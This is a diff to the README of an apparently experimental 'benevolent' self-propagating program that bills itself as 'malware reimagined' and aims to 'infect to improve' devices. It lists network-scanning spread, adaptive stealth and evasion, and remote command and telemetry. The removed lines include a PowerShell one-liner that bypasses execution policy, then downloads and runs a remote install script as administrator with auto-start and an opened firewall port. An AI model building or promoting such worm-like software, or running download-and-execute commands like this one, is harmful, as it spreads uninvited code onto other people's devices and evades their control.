@@ -9,11 +9,23 @@
 [![Python](https://img.shields.io/badge/python-3.10+-purple.svg)](https://python.org)
 [![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows%20%7C%20Android%20%7C%20macOS-orange.svg)](#)
 
-**Self-propagating code that optimizes, secures, and protects devices**
+**Experimental framework for a benevolent systems-management agent**
 
 [Features](#-features) • [Quick Start](#-quick-start) • [Documentation](#-documentation) • [Safety](#-safety) • [Contributing](#-contributing)
 
 </div>
+
+---
+
+## ⚠️ Current Status
+
+This repository is an **early-stage prototype**. It contains:
+- working support modules for safety, control, profiling, and parts of protection/optimization
+- a newer orchestrator that wires modules together
+- incomplete runtime behavior in the main loop
+- documentation that previously described the intended end state rather than the current implementation
+
+The project concept remains "infect to improve", but the codebase today is better understood as a research/prototype repository than a production-ready deployment.
 
 ---
 
@@ -29,17 +41,17 @@ This is malware reimagined: a self-propagating system that improves every device
 
 ## 🌟 Features
 
-### Core Capabilities
+### Repository Capabilities
 
 - **🔧 System Optimization** - Performance tuning, bloatware removal, resource management
 - **🛡️ Security Hardening** - Vulnerability scanning, automated patching, firewall management
 - **🦠 Malware Protection** - Threat detection, safe removal, quarantine system
-- **🕵️ Dynamic Stealth** - Adaptive evasion, environment detection, behavior mimicry
-- **🚀 Self-Propagation** - Network scanning, target prioritization, carrier-based spread
+- **🕵️ Dynamic Stealth** - Design present, implementation status mixed
+- **🚀 Self-Propagation** - Design present, implementation status mixed
 - **🎮 Gaming Mode** - Invisible during gameplay (5% CPU max)
 - **📡 Remote Control** - Kill switch, commands, telemetry, updates
 
-### Platform Support
+### Intended Platform Support
 
 | Platform | Mode | Behavior |
 |----------|------|----------|
@@ -48,61 +60,26 @@ This is malware reimagined: a self-propagating system that improves every device
 | **📱 Android** | Active | ADB optimization |
 | **🍎 macOS** | Limited | Light optimization |
 
-### Optimization Features
+### Implemented Or In-Progress Areas
 
-**Windows:**
-- Remove 35+ bloatware apps (Candy Crush, Bixby, etc.)
-- Privacy optimization (telemetry, tracking)
-- Performance tuning (SysMain, power plans)
-- Security hardening (Defender, Firewall, UAC)
+**Core/runtime:**
+- A legacy `ProtocolCore` with several `TODO` sections
+- A newer `src/core/orchestrator.py` that initializes modules and exposes helper methods
+- Main loop cycles that are still mostly skeletal
 
-**Android:**
-- Remove 40+ bloatware apps (manufacturer + carrier)
-- Battery optimization (animations, services)
-- Performance tuning (GPU, cache clearing)
-- Privacy enhancement (tracking, permissions)
+**Safety/control:**
+- Behavioral constraints with forbidden actions, opt-out checks, emergency stop checks, and mode/resource logic
+- Kill switch, command receiver, telemetry sender, heartbeat manager, and update receiver modules
 
-**Linux:**
-- Performance optimization (CPU governor, memory, disk)
-- Security hardening (SSH, firewall, permissions)
-- Carrier mode (spread without modifying)
-
-**Security:**
-- 16 vulnerability checks (Linux + Windows)
-- Automated hardening with rollback
-- Malware detection (10 threat types)
-- Safe removal with quarantine
-
-**Control System:**
-- Kill switch (soft/hard/nuclear shutdown levels)
-- Remote command receiver with HMAC auth
-- Privacy-preserving telemetry
-- Heartbeat with dead man's switch
-- Atomic updates with rollback
+**Analysis/protection/optimization:**
+- System profiling, vulnerability scanning, malware scanning/removal, and optimization modules are present
+- Actual integration depth varies by module and should be treated as implementation-in-progress
 
 ---
 
 ## 🚀 Quick Start
 
-### Windows Installation (Zero Prerequisites!)
-
-**Run as Administrator** - No Python needed, everything is bundled:
-
-```powershell
-# One-liner standalone install (includes Python!)
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-WebRequest -Uri "https://r0s.org/benevolent-protocol-install.ps1" -OutFile "install.ps1"; .\install.ps1
-```
-
-This will:
-- Download embedded Python 3.12 (no system install needed)
-- Download and install the protocol
-- Install all dependencies in isolated environment
-- Create scheduled task for auto-start
-- Configure Windows Firewall (port 9527)
-- Generate secure configuration with secret key
-- Create desktop shortcut and helper scripts
-
-### Alternative: Manual Install (Requires Python)
+### Manual Install
 
 <details>
 <summary>Click to expand manual installation</summary>
@@ -133,30 +110,21 @@ python src/protection/vulnerability_scanner.py
 # Scan for malware
 python src/protection/malware_scanner.py
 
-# Test gaming mode
-python test_gaming_mode.py
-```
-
-### Android Optimization
-
-```bash
-# Enable USB debugging on your Android device
-# Connect via USB and accept RSA key
-
-# Scan device
-python src/optimization/android_optimizer.py
+# Run orchestrator module directly
+python -m src.core.orchestrator
 ```
 
 ### Run Tests
 
 ```bash
-# Test all features
-python test_gaming_mode.py      # Gaming detection
-python test_windows_tools.py    # Windows features
-python test_propagation.py      # Network scanning
-python test_android.py          # Android optimization
-python test_security.py         # Security hardening
-python test_malware.py          # Malware scanning
+# Current test files in the repo
+pytest tests/test_control.py
+pytest tests/test_integration.py
+python test_gaming_mode.py
+python test_windows_tools.py
+python test_propagation.py
+python test_security.py
+python test_malware.py
 ```
 
 ---
@@ -179,6 +147,10 @@ python test_malware.py          # Malware scanning
 - **Gaming Mode** - Invisible during gameplay
 - **Rollback System** - Complete reversibility
 - **Emergency Stop** - Immediate halt capability
+
+### Documentation Note
+
+Some architecture and strategy documents still describe the intended system rather than the exact current runtime. Use the source tree as the canonical reference where docs and code disagree.
 
 ---
 
@@ -264,8 +236,7 @@ benevolent_protocol/
 │   ├── optimization/            # Performance & bloatware
 │   │   ├── performance_tuner.py
 │   │   ├── windows_bloatware.py
-│   │   ├── windows_optimizer.py
-│   │   └── android_optimizer.py
+│   │   └── windows_optimizer.py
 │   ├── safety/                  # Behavioral constraints
 │   ├── propagation/             # Network scanner & stealth
 │   │   ├── network_scanner.py
@@ -295,14 +266,14 @@ benevolent_protocol/
 ### Run All Tests
 
 ```bash
-# Comprehensive test suite
+# Current repo test entry points
 python test_gaming_mode.py      # Gaming detection
 python test_windows_tools.py    # Windows features
 python test_propagation.py      # Network scanning
-python test_android.py          # Android optimization
 python test_security.py         # Security hardening
 python test_malware.py          # Malware scanning
-python test_control.py          # Remote control system
+pytest tests/test_control.py    # Remote control system
+pytest tests/test_integration.py
 ```
 
 ### Expected Results
